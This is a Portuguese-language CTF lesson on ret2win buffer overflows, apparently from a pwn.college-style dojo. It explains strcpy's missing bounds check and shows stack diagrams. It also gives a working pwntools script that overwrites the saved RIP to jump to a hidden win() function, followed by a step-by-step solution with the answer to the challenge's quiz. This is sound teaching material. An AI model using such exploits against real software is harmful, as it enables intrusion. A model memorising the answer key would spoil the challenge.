# Sequestrando o RIP para a Função Win()

### 📖 Introdução Teórica

Na exploração de software em código binário fechado (Black-Box Testing), analistas ofensivos frequentemente encontram sub-rotinas de depuração, funções administrativas esquecidas por desenvolvedores ou rotinas de teste (comumente chamadas de `win()`, `print_flag()` ou `backdoor()`). Essas funções contêm o código necessário para ler arquivos confidenciais ou abrir privilégios, mas **nunca são invocadas no fluxo normal de execução do programa**.

A técnica canônica de **Return-to-Win (`ret2win`)** consiste em explorar uma falha de estouro de buffer para sobrescrever cirurgicamente o endereço de retorno salvo na pilha (**`Saved RIP`**), redirecionando o fluxo da CPU diretamente para a função desejada.

#### Por que a Função `strcpy` é Notoriamente Insegura?
A biblioteca padrão da linguagem C (`string.h`) possui a função histórica:
```c
char *strcpy(char *dest, const char *src);
```
O algoritmo interno de `strcpy` em assembly opera em um laço cego:
1. Lê um byte da memória de origem `src`.
2. Escreve esse byte na memória de destino `dest`.
3. Compara o byte gravado com o terminador nulo `\0` (ASCII `0x00`).
4. Se não for nulo, incrementa os ponteiros e repete o laço.

**O erro fatal de arquitetura:** `strcpy` **não recebe nenhum parâmetro com o tamanho alocado para o buffer de destino (`dest`)**. Se `dest` foi dimensionado para 64 bytes e a entrada `src` contiver 80 bytes, a função continuará escrevendo cegamente, transbordando o array e sobrescrevendo estruturas vizinhas na pilha!

*Alternativas seguras em C moderno:* `strncpy(dest, src, sizeof(dest) - 1)` garantindo o terminador nulo, `snprintf(dest, sizeof(dest), "%s", src)` ou `strlcpy()`.

```
ESTADO NORMAL DA PILHA (Antes da Sobrescrita):
[ Endereços Altos ]
  0x7fffffffe050:  0x0000000000401340  <--- Saved RIP Legítimo (Retorno para a main)
  0x7fffffffe048:  0x7fffffffe080      <--- Saved RBP Legítimo
  0x7fffffffe008:  [ buffer (64 B) ]   <--- Alocado para variáveis locais
[ Endereços Baixos ]

ESTADO CORROMPIDO APÓS EXPLOIT RET2WIN:
[ Endereços Altos ]
  0x7fffffffe050:  0x00000000004011f6  <--- SAVED RIP SOBRESCRITO COM O ENDEREÇO DE win()!
  0x7fffffffe048:  0x4141414141414141  <--- Saved RBP esmagado por lixo de preenchimento
  0x7fffffffe008:  "AAAAAAAAAAAAAAAA"  <--- Buffer saturado com 64 bytes 'A'
[ Endereços Baixos ]
```

#### A Execução do Salto via Instrução `RET`
Quando a função vulnerável atinge seu término, o processador executa o epílogo:
```assembly
leave
ret     ; Executa internamente: pop rip
```
A CPU desempilha os 8 bytes do topo da pilha e os carrega diretamente no registrador **`RIP`**. Como o topo da pilha agora contém `0x00000000004011f6` (o endereço da função `win()`), o processador salta imediatamente para ela, executando a rotina de leitura da flag!

---

### 💻 Exemplos Práticos e Sintaxe

A construção do exploit ret2win envolve localização estática do endereço da função e montagem precisa de payload com `pwntools`:

#### 1. Localizando o Endereço de `win()` com `objdump` e `nm`
```bash
# Localizar a função win() na tabela de símbolos desmontada:
objdump -d -M intel ./binario | grep "<win>:"

# Alternativa rápida com nm:
nm ./binario | grep win
```
*Saída obtida:*
```text
00000000004011f6 T win
```

#### 2. Construindo o Script de Exploit em Python (Pwntools)
```python
#!/usr/bin/env python3
from pwn import *

# Configurar o contexto para arquitetura x86_64
context.arch = 'amd64'
context.os = 'linux'

# 1. Definir parâmetros da missão
binary_path = "/challenge/pwn-win-function-redirection"
win_addr = 0x00000000004011f6
offset = 72  # 64 bytes de buffer local + 8 bytes do Saved RBP

# 2. Empacotar o endereço de win() em Little-Endian de 64 bits (p64):
payload = b"A" * offset + p64(win_addr)

# 3. Disparar contra o processo e receber a flag:
p = process(binary_path)
p.sendline(payload)
print(p.recvall().decode())
```

#### 3. Alinhamento de Pilha (*Stack Alignment 16-Byte*)
Em sistemas Linux x86_64 modernos, certas funções da `glibc` (como `printf` ou `system`) utilizam instruções SIMD/SSE (ex: `movaps`) que exigem que o registrador `RSP` esteja alinhado em múltiplos de 16 bytes. Se o seu exploit causar crash dentro de `win()`, insira o endereço de uma instrução `ret` avulsa antes do endereço de `win()` no payload para realinhar a pilha em 8 bytes.

---

### 🎯 O que fazer para resolver o desafio (Passo a Passo)

Siga os passos abaixo para resolver a missão e capturar a flag:

1. **Inicie o desafio no terminal:**
   Execute `/challenge/pwn-win-function-redirection`:
   ```bash
   /challenge/pwn-win-function-redirection
   ```
   *O desafio informará que o binário contém a função oculta `win()` em `0x00000000004011f6`.*

2. **Revise a aula teórica (Opcional):**
   Para estudar os detalhes da vulnerabilidade de `strcpy` e scripts ret2win:
   ```bash
   /challenge/pwn-win-function-redirection --help
   ```

3. **Avalie a pergunta conceitual:**
   O binário apresentará a seguinte questão:
   > *"Qual função clássica de manipulação de strings na biblioteca padrão C é notória por causar buffer overflow por não checar limites de memória?"*
   * A) `strncpy`
   * **B) `strcpy`**
   * C) `snprintf`
   * D) `fgets`

4. **Forneça a alternativa correta:**
   Digite **`B`** (ou `strcpy`) no prompt interativo e pressione Enter.
   *Alternativamente, envie diretamente via argumento de terminal:*
   ```bash
   /challenge/pwn-win-function-redirection B
   ```
   *(O desafio também aceita um payload que referencie `win`, `4011f6` ou `strcpy`)*.

5. **Capture a flag:**
   O sistema validará o entendimento sobre o vetor de buffer overflow e emitirá a flag:
   ```text
   [+] DEBRIEFING TÉCNICO: RIP REDIRECIONADO COM SUCESSO PARA WIN()!
   [FLAG DE VALIDAÇÃO CYBERGUARD]:
   pwn.college{...}
   ```
   Copie a string no formato `pwn.college{...}` e submeta-a no painel do dojo.
